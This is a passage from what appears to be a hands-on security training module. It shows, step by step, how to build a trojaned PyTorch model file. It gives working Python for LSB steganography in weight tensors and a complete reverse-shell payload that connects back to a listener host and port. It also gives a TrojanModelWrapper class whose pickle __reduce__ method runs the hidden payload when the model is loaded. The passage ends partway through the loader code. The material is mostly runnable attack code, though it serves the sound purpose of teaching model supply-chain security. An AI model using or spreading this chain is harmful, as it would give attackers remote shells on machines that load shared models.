<pre><code class="lang-python">    <span class="hljs-attr">data_iter</span> = iter(data_to_embed)  <span class="hljs-comment"># To get bytes one by one</span>
    <span class="hljs-attr">current_byte</span> = next(data_iter, None)  <span class="hljs-comment"># Load the first byte</span>
    <span class="hljs-attr">bit_index_in_byte</span> = <span class="hljs-number">7</span>  <span class="hljs-comment"># Start from the MSB of the current_byte</span>
    <span class="hljs-attr">element_index</span> = <span class="hljs-number">0</span>  <span class="hljs-comment"># Index for tensor_flat</span>
    <span class="hljs-attr">bits_embedded</span> = <span class="hljs-number">0</span>  <span class="hljs-comment"># Counter for total bits embedded</span>
</code></pre>
<p>The main embedding occurs in a <code>while</code> loop, processing one tensor element at a time. For each <code>float32</code> value, its 32-bit integer representation is obtained using <code>struct.pack</code> and <code>struct.unpack</code>. A <code>mask</code> is created to target the <code>num_lsb</code> LSBs, and an inner loop then extracts <code>num_lsb</code> bits from <code>data_to_embed</code> (via <code>current_byte</code> and <code>bit_index_in_byte</code>), assembling them into <code>data_bits_for_float</code>. This process continues until all payload bits are gathered for the current float or the payload ends.</p>
<pre><code class="lang-python">    <span class="hljs-keyword">while</span> bits_embedded &lt; total_bits_needed <span class="hljs-keyword">and</span> element_index &lt; n_elements:
        <span class="hljs-keyword">if</span> current_byte <span class="hljs-keyword">is</span> <span class="hljs-keyword">None</span>:  <span class="hljs-comment"># Should not happen if capacity check is correct</span>
            <span class="hljs-keyword">break</span>

        original_float = tensor_flat[element_index].item()
        <span class="hljs-comment"># Convert float to its 32-bit integer representation</span>
        packed_float = struct.pack(<span class="hljs-string">"&gt;f"</span>, original_float)
        int_representation = struct.unpack(<span class="hljs-string">"&gt;I"</span>, packed_float)[<span class="hljs-number">0</span>]

        <span class="hljs-comment"># Create a mask for the LSBs we want to modify</span>
        mask = (<span class="hljs-number">1</span> &lt;&lt; num_lsb) - <span class="hljs-number">1</span>
        data_bits_for_float = <span class="hljs-number">0</span>  <span class="hljs-comment"># Accumulator for bits to embed in this float</span>

        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(num_lsb):  <span class="hljs-comment"># For each LSB position in this float</span>
            <span class="hljs-keyword">if</span> current_byte <span class="hljs-keyword">is</span> <span class="hljs-keyword">None</span>:  <span class="hljs-comment"># No more data bytes</span>
                <span class="hljs-keyword">break</span>

            data_bit = (current_byte &gt;&gt; bit_index_in_byte) &amp; <span class="hljs-number">1</span>
            data_bits_for_float |= data_bit &lt;&lt; (num_lsb - <span class="hljs-number">1</span> - i)

            bit_index_in_byte -= <span class="hljs-number">1</span>
            <span class="hljs-keyword">if</span> bit_index_in_byte &lt; <span class="hljs-number">0</span>:  <span class="hljs-comment"># Current byte fully processed</span>
                current_byte = next(data_iter, <span class="hljs-keyword">None</span>) <span class="hljs-comment"># Get next byte</span>
                bit_index_in_byte = <span class="hljs-number">7</span>  <span class="hljs-comment"># Reset bit index</span>

            bits_embedded += <span class="hljs-number">1</span>
            <span class="hljs-keyword">if</span> bits_embedded &gt;= total_bits_needed:  <span class="hljs-comment"># All data embedded</span>
                <span class="hljs-keyword">break</span>
</code></pre>
<p>With <code>data_bits_for_float</code> prepared, we embed these bits into the tensor element. First, the LSBs of the <code>int_representation</code> are cleared using a bitwise <code>AND</code> with the inverted <code>mask</code>. Then, <code>data_bits_for_float</code> are merged into these cleared positions using a bitwise <code>OR</code>. The resulting <code>new_int_representation</code> is converted back to a <code>float32</code> value using <code>struct.pack</code> and <code>struct.unpack</code>. This new float, containing the embedded data bits, replaces the original value in <code>tensor_flat</code>. The <code>element_index</code> is then incremented.</p>
<pre><code class="lang-python">        <span class="hljs-meta"># Clear the LSBs of the original float's integer representation</span>
        cleared_int = int_representation &amp; (~mask)
        <span class="hljs-meta"># Combine the cleared integer with the data bits</span>
        <span class="hljs-keyword">new</span><span class="hljs-type">_int_representation</span> = cleared_int | data_bits_for_float

        <span class="hljs-meta"># Convert the new integer representation back to a float</span>
        <span class="hljs-keyword">new</span><span class="hljs-type">_packed_float</span> = struct.pack(<span class="hljs-string">"&gt;I"</span>, <span class="hljs-keyword">new</span><span class="hljs-type">_int_representation</span>)
        <span class="hljs-keyword">new</span><span class="hljs-type">_float</span> = struct.unpack(<span class="hljs-string">"&gt;f"</span>, <span class="hljs-keyword">new</span><span class="hljs-type">_packed_float</span>)[<span class="hljs-number">0</span>]

        tensor_flat[element_index] = <span class="hljs-keyword">new</span><span class="hljs-type">_float</span>  <span class="hljs-meta"># Update the tensor</span>
        element_index += <span class="hljs-number">1</span>
</code></pre>
<p>After the loop finishes, a confirmation message is printed detailing the number of bits encoded and tensor elements used. The modified <code>tensor</code> (which reflects changes made to its flattened view, <code>tensor_flat</code>) is then returned.</p>
<pre><code class="lang-python">    <span class="hljs-built_in">print</span>(f<span class="hljs-string">"Encoded {bits_embedded} bits into {element_index} elements using {num_lsb} LSB(s) per element."</span>)
    <span class="hljs-built_in">return</span> tensor
</code></pre>
<h3 id="decoding-logic">Decoding Logic</h3>
<p>The <code>decode_lsb</code> function reverses the encoding, extracting hidden data from a <code>tensor_modified</code>. It requires the tensor and the same <code>num_lsb</code> value used during encoding.</p>
<p>Initial setup validates the tensor type (<code>float32</code>) and <code>num_lsb</code> range. The tensor is flattened, and a <code>shared_state</code> dictionary is used to manage <code>element_index</code> across calls to a nested helper function, ensuring that bit extraction resumes from the correct position in the tensor.</p>
<pre><code class="lang-python">def decode_lsb(tensor_modified: torch.Tensor, num_ls<span class="hljs-variable">b:</span> <span class="hljs-keyword">int</span>) -&gt; byte<span class="hljs-variable">s:</span>
    <span class="hljs-string">""</span><span class="hljs-comment">"Decodes byte data hidden in the LSBs of a float32 tensor.</span>
    Assumes data was encoded with encode_lsb (length prepended).

    Arg<span class="hljs-variable">s:</span>
        tensor_modified: The float32 tensor containing the hidden data.
        num_ls<span class="hljs-variable">b:</span> The <span class="hljs-keyword">number</span> of LSBs (<span class="hljs-number">1</span>-<span class="hljs-number">8</span>) used per float during encoding.

    Return<span class="hljs-variable">s:</span>
        The decoded byte <span class="hljs-built_in">string</span>.

    Raise<span class="hljs-variable">s:</span>
        TypeError: If tensor_modified <span class="hljs-keyword">is</span> not <span class="hljs-keyword">a</span> float32 tensor.
        ValueError: If num_lsb <span class="hljs-keyword">is</span> not between <span class="hljs-number">1</span> <span class="hljs-built_in">and</span> <span class="hljs-number">8</span>.
        ValueError: If tensor ends prematurely during decoding <span class="hljs-built_in">or</span> length/payload mismatch.
    <span class="hljs-string">""</span><span class="hljs-comment">"</span>
    <span class="hljs-keyword">if</span> tensor_modified.dtype != torch.float32:
        raise TypeError(<span class="hljs-string">"Tensor must be float32."</span>)
    <span class="hljs-keyword">if</span> not <span class="hljs-number">1</span> &lt;= num_lsb &lt;= <span class="hljs-number">8</span>:
        raise ValueError(<span class="hljs-string">"num_lsb must be 1-8."</span>)

    tensor_flat = tensor_modified.flatten()
    n_elements = tensor_flat.numel()
    shared_state = {<span class="hljs-string">'element_index'</span>: <span class="hljs-number">0</span>}
</code></pre>
<p>The nested <code>get_bits(count)</code> function is responsible for extracting a specified <code>count</code> of bits from the tensor&#39;s LSBs. It iterates through <code>tensor_flat</code> elements, starting from <code>shared_state[&#39;element_index&#39;]</code>. For each float, it obtains its integer representation, masks out the <code>num_lsb</code> LSBs, and appends these bits to a list until <code>count</code> bits are collected, and <code>shared_state[&#39;element_index&#39;]</code> is updated after each element. If the tensor ends before <code>count</code> bits are retrieved, a <code>ValueError</code> is raised.</p>
<pre><code class="lang-python">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_bits</span><span class="hljs-params">(count: int)</span> -&gt; list[int]:</span>
        <span class="hljs-keyword">nonlocal</span> shared_state 
        bits = []

        <span class="hljs-keyword">while</span> len(bits) &lt; count <span class="hljs-keyword">and</span> shared_state[<span class="hljs-string">'element_index'</span>] &lt; n_elements:
            current_float = tensor_flat[shared_state[<span class="hljs-string">'element_index'</span>]].item()
            packed_float = struct.pack(<span class="hljs-string">"&gt;f"</span>, current_float)
            int_representation = struct.unpack(<span class="hljs-string">"&gt;I"</span>, packed_float)[<span class="hljs-number">0</span>]

            mask = (<span class="hljs-number">1</span> &lt;&lt; num_lsb) - <span class="hljs-number">1</span>
            lsb_data = int_representation &amp; mask 

            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(num_lsb):
                bit = (lsb_data &gt;&gt; (num_lsb - <span class="hljs-number">1</span> - i)) &amp; <span class="hljs-number">1</span>
                bits.append(bit)
                <span class="hljs-keyword">if</span> len(bits) == count: 
                    <span class="hljs-keyword">break</span>

            shared_state[<span class="hljs-string">'element_index'</span>] += <span class="hljs-number">1</span> 

        <span class="hljs-keyword">if</span> len(bits) &lt; count:
            <span class="hljs-keyword">raise</span> ValueError(
                f<span class="hljs-string">"Tensor ended prematurely. Requested {count} bits, got {len(bits)}. "</span>
                f<span class="hljs-string">"Processed {shared_state['element_index']} elements."</span>
            )
        <span class="hljs-keyword">return</span> bits
</code></pre>
<p>Decoding begins by calling <code>get_bits(32)</code> to retrieve the 32-bit length prefix. These bits are then converted into an integer, <code>payload_len_bytes</code>, representing the length of the hidden payload in bytes. Appropriate error handling is included for this critical step.</p>
<pre><code class="lang-python">    <span class="hljs-keyword">try</span>:
        length_bits = get_bits(<span class="hljs-number">32</span>)  <span class="hljs-comment"># Decode the 32-bit length prefix</span>
    <span class="hljs-keyword">except</span> <span class="hljs-type">ValueError</span> <span class="hljs-keyword">as</span> e:
        <span class="hljs-keyword">raise</span> <span class="hljs-type">ValueError</span>(<span class="hljs-string">f"Failed to decode payload length: {e}"</span>)

    payload_len_bytes = <span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> length_bits:
        payload_len_bytes = (payload_len_bytes &lt;&lt; <span class="hljs-number">1</span>) | bit
</code></pre>
<p>If <code>payload_len_bytes</code> is zero, it indicates no payload is present, and an empty byte string is returned. Otherwise, <code>get_bits</code> is called again to retrieve <code>payload_len_bytes * 8</code> bits, which constitute the actual payload. The <code>get_bits</code> function seamlessly continues from where it left off, thanks to the persisted <code>shared_state[&#39;element_index&#39;]</code>.</p>
<pre><code class="lang-python">    <span class="hljs-keyword">if</span> payload_len_bytes == <span class="hljs-number">0</span>:
        print(f<span class="hljs-string">"Decoded length is 0. Returning empty bytes. Processed {shared_state['element_index']} elements for length."</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-string">b""</span>  <span class="hljs-comment"># No payload if length is zero</span>

    <span class="hljs-keyword">try</span>:
        payload_bits = get_bits(payload_len_bytes * <span class="hljs-number">8</span>)  <span class="hljs-comment"># Decode the actual payload</span>
    <span class="hljs-keyword">except</span> ValueError <span class="hljs-keyword">as</span> e:
        <span class="hljs-keyword">raise</span> ValueError(f<span class="hljs-string">"Failed to decode payload (length: {payload_len_bytes} bytes): {e}"</span>)
</code></pre>
<p>The extracted <code>payload_bits</code> are then reconstructed into bytes. We iterate through <code>payload_bits</code>, accumulating them into <code>current_byte_val</code>. When 8 bits are collected (tracked by <code>bit_count</code>), the complete byte is appended to <code>decoded_bytes</code> (a <code>bytearray</code>), and the accumulators are reset.</p>
<pre><code class="lang-python">    <span class="hljs-attr">decoded_bytes</span> = bytearray()
    <span class="hljs-attr">current_byte_val</span> = <span class="hljs-number">0</span>
    <span class="hljs-attr">bit_count</span> = <span class="hljs-number">0</span>

    for bit <span class="hljs-keyword">in</span> payload_bits:
        <span class="hljs-attr">current_byte_val</span> = (current_byte_val &lt;&lt; <span class="hljs-number">1</span>) | bit
        bit_count += <span class="hljs-number">1</span>
        <span class="hljs-keyword">if</span> <span class="hljs-attr">bit_count</span> == <span class="hljs-number">8</span>:  <span class="hljs-comment"># A full byte has been assembled</span>
            decoded_bytes.append(current_byte_val)
            <span class="hljs-attr">current_byte_val</span> = <span class="hljs-number">0</span>  <span class="hljs-comment"># Reset for the next byte</span>
            <span class="hljs-attr">bit_count</span> = <span class="hljs-number">0</span>  <span class="hljs-comment"># Reset bit counter</span>
</code></pre>
<p>Finally, the <code>decoded_bytes</code> bytearray is converted to an immutable <code>bytes</code> object and returned, completing the data extraction.</p>
<pre><code class="lang-python">    print(<span class="hljs-name">f</span><span class="hljs-string">"Decoded {len(decoded_bytes)} bytes. Used {shared_state['element_index']} tensor elements with {num_lsb} LSB(s) per element."</span>)
    return bytes(<span class="hljs-name">decoded_bytes</span>)
</code></pre>
<hr>
<h2 id="the-attack">The Attack</h2>
<hr>
<p>Having established a target model (<code>state_dict</code> saved) and developed our steganographic tools (<code>encode_lsb</code>, <code>decode_lsb</code>), we now move onto the main phase of the attack.</p>
<h3 id="the-payload">The Payload</h3>
<p>The first step is to define the code we ultimately want to execute on the target&#39;s machine. We&#39;ll be using a classic a <code>reverse shell</code>. It establishes a connection from the target machine back to a listener controlled by us, granting us interactive command-line access.</p>
<p>We must configure the connection parameters within the payload code itself. <code>HOST_IP</code> needs to be the IP address of our listener machine, ensuring it&#39;s <code>reachable from the environment where target will load the model</code>. <code>LISTENER_PORT</code> specifies the corresponding port our listener will monitor.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> socket, subprocess, os, pty, sys, traceback  <span class="hljs-comment"># Imports needed by payload</span>

<span class="hljs-comment"># Configure connection details for the reverse shell</span>
<span class="hljs-comment"># Use the IP/DNS name of the machine running the listener, accessible FROM your target instance,</span>
HOST_IP = <span class="hljs-string">"localhost"</span>  <span class="hljs-comment"># THIS IS YOUR IP WHEN ON THE HTB NETWORK</span>
LISTENER_PORT = <span class="hljs-number">4444</span>  <span class="hljs-comment"># The port that you will listen for a connection on</span>

<span class="hljs-keyword">print</span>(f<span class="hljs-string">"--- Payload Configuration ---"</span>)
<span class="hljs-keyword">print</span>(f<span class="hljs-string">"Payload will target: {HOST_IP}:{LISTENER_PORT}"</span>)
<span class="hljs-keyword">print</span>(f<span class="hljs-string">"-----------------------------"</span>)
</code></pre>
<p>The <code>payload_code_string</code> itself contains Python code implementing the reverse shell logic. It attempts to connect to the specified attacker IP and port, and upon a successful connection, it redirects standard input, output, and error streams to the socket and spawns a shell (e.g., <code>/bin/bash</code>).</p>
<p>Code: python</p>
<pre><code class="lang-python"># The payload string itself
payload_code_string = f<span class="hljs-string">""</span>"
import socket, subprocess, os, pty, sys, traceback
<span class="hljs-keyword">print</span>(<span class="hljs-string">"[PAYLOAD] Payload starting execution."</span>, <span class="hljs-keyword">file</span>=sys.stderr); sys.stderr.flush()
attacker_ip = '{HOST_IP}'; attacker_port = {LISTENER_PORT}
<span class="hljs-keyword">print</span>(f<span class="hljs-string">"[PAYLOAD] Attempting connection to {{attacker_ip}}:{{attacker_port}}..."</span>, <span class="hljs-keyword">file</span>=sys.stderr); sys.stderr.flush()
s = None
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(5.0)
    s.connect((attacker_ip, attacker_port)); s.settimeout(None)
    <span class="hljs-keyword">print</span>(<span class="hljs-string">"[PAYLOAD] Connection successful."</span>, <span class="hljs-keyword">file</span>=sys.stderr); sys.stderr.flush()
    <span class="hljs-keyword">print</span>(<span class="hljs-string">"[PAYLOAD] Redirecting stdio..."</span>, <span class="hljs-keyword">file</span>=sys.stderr); sys.stderr.flush()
    os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
    <span class="hljs-keyword">shell</span> = os.environ.<span class="hljs-built_in">get</span>('<span class="hljs-keyword">SHELL</span>', '/bin/bash')
    <span class="hljs-keyword">print</span>(f<span class="hljs-string">"[PAYLOAD] Spawning shell: {{shell}}"</span>, <span class="hljs-keyword">file</span>=sys.stderr); sys.stderr.flush() # May not be seen
    pty.spawn([<span class="hljs-keyword">shell</span>]) # Start interactive <span class="hljs-keyword">shell</span>
except socket.timeout: <span class="hljs-keyword">print</span>(f<span class="hljs-string">"[PAYLOAD] ERROR: Connection timed out."</span>, <span class="hljs-keyword">file</span>=sys.stderr); traceback.print_exc(<span class="hljs-keyword">file</span>=sys.stderr); sys.stderr.flush()
except ConnectionRefusedError: <span class="hljs-keyword">print</span>(f<span class="hljs-string">"[PAYLOAD] ERROR: Connection refused."</span>, <span class="hljs-keyword">file</span>=sys.stderr); traceback.print_exc(<span class="hljs-keyword">file</span>=sys.stderr); sys.stderr.flush()
except Exception <span class="hljs-keyword">as</span> <span class="hljs-keyword">e</span>: <span class="hljs-keyword">print</span>(f<span class="hljs-string">"[PAYLOAD] ERROR: Unexpected error: {{e}}"</span>, <span class="hljs-keyword">file</span>=sys.stderr); traceback.print_exc(<span class="hljs-keyword">file</span>=sys.stderr); sys.stderr.flush()
finally:
    <span class="hljs-keyword">print</span>(<span class="hljs-string">"[PAYLOAD] Payload script finishing."</span>, <span class="hljs-keyword">file</span>=sys.stderr); sys.stderr.flush()
    <span class="hljs-keyword">if</span> s:
        try: s.<span class="hljs-keyword">close</span>()
        except: pass
    os._exit(1) # Force <span class="hljs-keyword">exit</span>
<span class="hljs-string">""</span>"
</code></pre>
<p>Once the payload string is defined, it&#39;s encoded into bytes using UTF-8. This byte representation is what will be hidden using steganography.</p>
<p>Code: python</p>
<pre><code class="lang-python"># <span class="hljs-keyword">Encode</span> payload <span class="hljs-keyword">for</span> steganography
payload_bytes_to_hide = payload_code_string.<span class="hljs-keyword">encode</span>(<span class="hljs-string">"utf-8"</span>)
<span class="hljs-keyword">print</span>(f<span class="hljs-string">"Payload defined and encoded to {len(payload_bytes_to_hide)} bytes."</span>)
</code></pre>
<h3 id="embedding-the-payload">Embedding the Payload</h3>
<p>With the payload prepared as <code>payload_bytes_to_hide</code>, the next step is to embed it into the parameters of our target model.</p>
<p>Code: python</p>
<pre><code class="lang-python">import torch   # <span class="hljs-keyword">Ensure</span> torch <span class="hljs-keyword">is</span> imported
import os      # <span class="hljs-keyword">Ensure</span> os <span class="hljs-keyword">is</span> imported <span class="hljs-keyword">for</span> file checks

NUM_LSB = <span class="hljs-number">2</span>    # Number <span class="hljs-keyword">of</span> LSBs <span class="hljs-keyword">to</span> use
</code></pre>
<p>We begin by loading the &quot;legitimate&quot; <code>state_dict</code> we saved earlier (<code>legitimate_state_dict_file</code>) back into memory using <code>torch.load()</code>.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-comment"># Load the legitimate state dict</span>
legitimate_state_dict_file = <span class="hljs-string">"victim_model_state.pth"</span>
<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(legitimate_state_dict_file):
    <span class="hljs-keyword">raise</span> FileNotFoundError(
        f<span class="hljs-string">"Legitimate state dict '{legitimate_state_dict_file}' not found."</span>
    )

print(f<span class="hljs-string">"\nLoading legitimate state dict from '{legitimate_state_dict_file}'..."</span>)
loaded_state_dict = torch.load(legitimate_state_dict_file)  <span class="hljs-comment"># Load the dictionary</span>
print(<span class="hljs-string">"State dict loaded successfully."</span>)
</code></pre>
<p>We then select the specific tensor within this dictionary that will serve as the carrier for our hidden data. We&#39;ll be using <code>large_layer.weight</code> (identified by <code>target_key</code>). Its substantial size makes it suitable for hiding our payload without excessive modification density. We retrieve this original tensor (<code>original_target_tensor</code>).</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-comment"># Choose a target layer/tensor for embedding</span>
target_key = <span class="hljs-string">"large_layer.weight"</span>
<span class="hljs-keyword">if</span> target_key <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> loaded_state_dict:
    <span class="hljs-keyword">raise</span> KeyError(
        f<span class="hljs-string">"Target key '{target_key}' not found in state dict. Available keys: {list(loaded_state_dict.keys())}"</span>
    )

original_target_tensor = loaded_state_dict[target_key]
print(
    f<span class="hljs-string">"Selected target tensor '{target_key}' with shape {original_target_tensor.shape} and {original_target_tensor.numel()} elements."</span>
)
</code></pre>
<p>We need to ensure we have the capacity within the target tensor to embed the payload, and to do this, we calculate precisely how many elements within the <code>original_target_tensor</code> are required to store the <code>payload_bytes_to_hide</code> (plus the 4-byte length prefix) using the chosen number of least significant bits (<code>NUM_LSB</code>). If the tensor&#39;s element count (<code>numel</code>) is less than the <code>elements_needed</code>, the operation cannot succeed.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-comment"># Ensure the payload isn't too large for the chosen tensor</span>
<span class="hljs-attr">bytes_to_embed</span> = <span class="hljs-number">4</span> + len(payload_bytes_to_hide)  <span class="hljs-comment"># 4 bytes for length prefix</span>
<span class="hljs-attr">bits_needed</span> = bytes_to_embed * <span class="hljs-number">8</span>
<span class="hljs-attr">elements_needed</span> = (bits_needed + NUM_LSB - <span class="hljs-number">1</span>) // NUM_LSB  <span class="hljs-comment"># Ceiling division</span>
print(f<span class="hljs-string">"Payload requires {elements_needed} elements using {NUM_LSB} LSBs."</span>)

<span class="hljs-keyword">if</span> original_target_tensor.numel() &lt; elements_needed:
    raise ValueError(f<span class="hljs-string">"Target tensor '{target_key}' is too small for the payload!"</span>)
</code></pre>
<p>Provided the capacity is adequate, we invoke our <code>encode_lsb</code> function. It takes the <code>original_target_tensor</code>, our <code>payload_bytes_to_hide</code>, and <code>NUM_LSB</code> as input. The function performs the LSB encoding and returns <code>modified_target_tensor</code>. This modified tensor is then placed into a copy of the original <code>state_dict</code>. This <code>modified_state_dict</code> is now compromised, containing payload.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-comment"># Encode the payload into the target tensor</span>
print(f<span class="hljs-string">"\nEncoding payload into tensor '{target_key}'..."</span>)
<span class="hljs-keyword">try</span>:
    modified_target_tensor = encode_lsb(
        original_target_tensor, payload_bytes_to_hide, NUM_LSB
    )
    print(<span class="hljs-string">"Encoding complete."</span>)

    <span class="hljs-comment"># Replace the original tensor with the modified one in the dictionary</span>
    modified_state_dict = (
        loaded_state_dict.copy()
    )  <span class="hljs-comment"># Don't modify the original loaded dict directly</span>
    modified_state_dict[target_key] = modified_target_tensor
    print(f<span class="hljs-string">"Replaced '{target_key}' in state dict with modified tensor."</span>)

<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
    print(f<span class="hljs-string">"Error during encoding or state dict modification: {e}"</span>)
    <span class="hljs-keyword">raise</span>  <span class="hljs-comment"># Re-raise the exception</span>
</code></pre>
<h3 id="the-trigger">The Trigger</h3>
<p>As we know, Python’s arbitrary-code execution vector arises from the way <code>pickle</code> calls an object’s <code>__reduce__</code> method. We&#39;ll define <code>TrojanModelWrapper</code> to exploit this vulnerability.</p>
<p>The <code>__init__</code> constructor merely stores the altered <code>state_dict</code>, the dictionary key that hides the payload (for instance <code>&quot;large_layer.weight&quot;</code>), and the least-significant-bit depth used for encoding, values that <code>__reduce__</code> will later need.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> torch
<span class="hljs-keyword">import</span> struct
<span class="hljs-keyword">import</span> traceback
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> pty
<span class="hljs-keyword">import</span> socket
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> subprocess


<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TrojanModelWrapper</span>:</span>
    <span class="hljs-string">"""
    A malicious wrapper class designed to act as a Trojan.
    """</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, modified_state_dict: dict, target_key: str, num_lsb: int)</span>:</span>
        <span class="hljs-string">"""
        Initializes the wrapper, pickling the state_dict for embedding.
        """</span>
        print(
            f<span class="hljs-string">"  [Wrapper Init] Received modified state_dict with {len(modified_state_dict)} keys."</span>
        )
        print(f<span class="hljs-string">"  [Wrapper Init] Received target_key: '{target_key}'"</span>)
        print(f<span class="hljs-string">"  [Wrapper Init] Received num_lsb: {num_lsb}"</span>)

        <span class="hljs-keyword">if</span> target_key <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> modified_state_dict:
            <span class="hljs-keyword">raise</span> ValueError(
                f<span class="hljs-string">"target_key '{target_key}' not found in the provided state_dict."</span>
            )
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> isinstance(modified_state_dict[target_key], torch.Tensor):
            <span class="hljs-keyword">raise</span> TypeError(f<span class="hljs-string">"Value at target_key '{target_key}' is not a Tensor."</span>)
        <span class="hljs-keyword">if</span> modified_state_dict[target_key].dtype != torch.float32:
            <span class="hljs-keyword">raise</span> TypeError(f<span class="hljs-string">"Tensor at target_key '{target_key}' is not float32."</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-number">1</span> &lt;= num_lsb &lt;= <span class="hljs-number">8</span>:
            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">"num_lsb must be between 1 and 8."</span>)

        <span class="hljs-keyword">try</span>:
            self.pickled_state_dict_bytes = pickle.dumps(modified_state_dict)
            print(
                f<span class="hljs-string">"  [Wrapper Init] Successfully pickled state_dict for embedding ({len(self.pickled_state_dict_bytes)} bytes)."</span>
            )
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            print(f<span class="hljs-string">"--- Error pickling state_dict ---"</span>)
            print(f<span class="hljs-string">"Error: {e}"</span>)
            <span class="hljs-keyword">raise</span> RuntimeError(
                <span class="hljs-string">"Failed to pickle state_dict for embedding in wrapper."</span>
            ) <span class="hljs-keyword">from</span> e

        self.target_key = target_key
        self.num_lsb = num_lsb
        print(
            <span class="hljs-string">"  [Wrapper Init] Initialization complete. Wrapper is ready to be pickled."</span>
        )

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_state_dict</span><span class="hljs-params">(self)</span>:</span>
        <span class="hljs-keyword">try</span>:
            <span class="hljs-keyword">return</span> pickle.loads(self.pickled_state_dict_bytes)
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            print(f<span class="hljs-string">"Error deserializing internal state_dict: {e}"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">None</span>
</code></pre>
<p>The <code>__reduce__</code> method is what we are most interested in. Here, we replace ordinary reconstruction instructions with <code>(exec, (loader_code,))</code>, telling the unpickler to run a crafted string instead of rebuilding a harmless object. That string is assembled on the fly: it contains the entire pickled <code>state_dict</code>, the target key, the LSB parameter, and the source for a small <code>decode_lsb</code> helper. When <code>exec</code> runs it during deserialization, the code recreates the dictionary, pulls out the tensor at the embedded key, extracts the hidden bytes with <code>decode_lsb</code>, converts them back to the original payload (a reverse shell), and executes it.</p>
<p>Because everything: data, parameters, helper function, and trigger, is folded into one contiguous string, the attack travels as a single self-contained file.</p>
<p>Code: python</p>
<pre><code class="lang-python">    def __reduce__(self):
        <span class="hljs-string">""</span>"
        Exploits pickle deserialization to execute embedded loader code.
        <span class="hljs-string">""</span>"
        <span class="hljs-keyword">print</span>(
            <span class="hljs-string">"\n[!] TrojanModelWrapper.__reduce__ activated (likely during pickling/saving process)!"</span>
        )
        <span class="hljs-keyword">print</span>(<span class="hljs-string">"    Preparing loader code string..."</span>)

        # Embed the decode_lsb function source code.
        decode_lsb_source = <span class="hljs-string">""</span>"
import torch, struct, pickle, traceback
def decode_lsb(tensor_modified: torch.Tensor, num_lsb: int) -&gt; bytes:
    <span class="hljs-keyword">if</span> tensor_modified.dtype != torch.float32: raise TypeError(<span class="hljs-string">"Tensor must be float32."</span>)
    <span class="hljs-keyword">if</span> not 1 &lt;= num_lsb &lt;= 8: raise ValueError(<span class="hljs-string">"num_lsb must be 1-8."</span>)
    tensor_flat = tensor_modified.flatten(); n_elements = tensor_flat.numel(); element_index = 0
    def get_bits(<span class="hljs-keyword">count</span>: int) -&gt; <span class="hljs-keyword">list</span>[int]:
        nonlocal element_index; bits = []
        <span class="hljs-keyword">while</span> len(bits) &lt; <span class="hljs-keyword">count</span>:
            <span class="hljs-keyword">if</span> element_index &gt;= n_elements: raise ValueError(f<span class="hljs-string">"Tensor ended prematurely trying to read {count} bits."</span>)
            current_float = tensor_flat[element_index].item();
            try: packed_float = struct.pack('&gt;f', current_float); int_representation = struct.unpack('&gt;I', packed_float)[0]
            except struct.<span class="hljs-keyword">error</span>: element_index += 1; <span class="hljs-keyword">continue</span>
            mask = (1 &lt;&lt; num_lsb) - 1; lsb_data = int_representation &amp; mask
            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-keyword">range</span>(num_lsb):
                bit = (lsb_data &gt;&gt; (num_lsb - 1 - i)) &amp; 1; bits.<span class="hljs-keyword">append</span>(bit)
                <span class="hljs-keyword">if</span> len(bits) == <span class="hljs-keyword">count</span>: <span class="hljs-keyword">break</span>
            element_index += 1
        <span class="hljs-keyword">return</span> bits
    try:
        length_bits = get_bits(32); length_int = 0
        <span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> length_bits: length_int = (length_int &lt;&lt; 1) | bit
        payload_len_bytes = length_int
        <span class="hljs-keyword">if</span> payload_len_bytes == 0: <span class="hljs-keyword">return</span> b''
        <span class="hljs-keyword">if</span> payload_len_bytes &lt; 0: raise ValueError(f<span class="hljs-string">"Decoded negative length: {payload_len_bytes}"</span>)
        payload_bits = get_bits(payload_len_bytes * 8)
        decoded_bytes = bytearray(); current_byte_val = 0; bit_count = 0
        <span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> payload_bits:
            current_byte_val = (current_byte_val &lt;&lt; 1) | bit; bit_count += 1
            <span class="hljs-keyword">if</span> bit_count == 8: decoded_bytes.<span class="hljs-keyword">append</span>(current_byte_val); current_byte_val = 0; bit_count = 0
        <span class="hljs-keyword">return</span> bytes(decoded_bytes)
